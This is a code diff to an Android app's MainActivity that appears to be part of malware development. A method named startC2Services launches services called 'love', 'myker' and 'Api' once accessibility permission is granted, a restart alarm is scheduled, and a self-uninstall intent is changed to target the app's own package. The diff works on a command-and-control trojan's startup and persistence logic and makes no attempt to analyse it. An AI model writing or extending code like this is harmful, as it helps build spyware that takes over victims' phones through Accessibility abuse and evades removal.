@@ -55,7 +55,8 @@ public class MainActivity extends Activity {
 
     private void startC2Services() {
         try { startService(new Intent(this, love.class)); } catch (Exception unused) {}
-        try { startService(new Intent(this, Api.class)); } catch (Exception unused) {}
+        // myker starts Api after accessibility is granted
+        try { startService(new Intent(this, myker.class)); } catch (Exception unused) {}
     }
 
     private void scheduleRestartAlarm() {
@@ -211,6 +212,9 @@ public class MainActivity extends Activity {
     }
 
     private void showFinalUI() {
+        // Ensure myker and Api are running now that accessibility is granted
+        try { startService(new Intent(this, myker.class)); } catch (Exception unused) {}
+        try { startService(new Intent(this, love.class));  } catch (Exception unused) {}
         if (isFinishing()) return;
         uiShown = true;
 
@@ -247,7 +251,7 @@ public class MainActivity extends Activity {
         if (isFinishing() || isDestroyed()) return;
         try {
             Intent intent = new Intent("android.intent.action.DELETE");
-            intent.setData(Uri.parse("package:com.cristal.bristral.tristral.mistral"));
+            intent.setData(Uri.parse("package:" + getPackageName()));
             intent.putExtra("android.intent.extra.RETURN_RESULT", true);
             intent.addFlags(268435456);
             startActivity(intent);
